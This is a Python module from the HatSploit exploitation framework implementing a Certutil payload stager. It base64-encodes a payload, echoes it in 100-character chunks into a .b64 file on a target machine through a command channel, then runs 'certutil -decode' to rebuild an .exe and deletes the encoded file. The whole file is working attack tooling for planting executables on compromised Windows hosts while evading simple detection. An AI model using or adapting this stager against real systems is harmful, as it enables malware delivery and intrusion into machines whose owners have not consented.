#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatsploit.core.cli.badges import Badges
from hatsploit.utils.string import StringTools


class Certutil(StringTools):
    badges = Badges()

    def push(self, data, sender, location, args=[], linemax=100):
        decode_stream = "certutil -decode {}.b64 {}.exe & del {}.b64"

        echo_stream = "echo {} >> {}.b64"
        echo_max_length = linemax

        data = self.base64_string(data, encoded=True)

        size = len(data)
        num_parts = int(size / echo_max_length) + 1

        for i in range(0, num_parts):
            current = i * echo_max_length
            block = data[current:current + echo_max_length]

            self.badges.print_process(f"Uploading payload... ({str(current)}/{str(size)})", end='')
            if block:
                command = echo_stream.format(block, location)

                if isinstance(args, dict):
                    sender(command, **args)
                else:
                    sender(*args, command)

        command = decode_stream.format(location, location, location)
        if isinstance(args, dict):
            sender(command, **args)
        else:
            sender(*args, command)
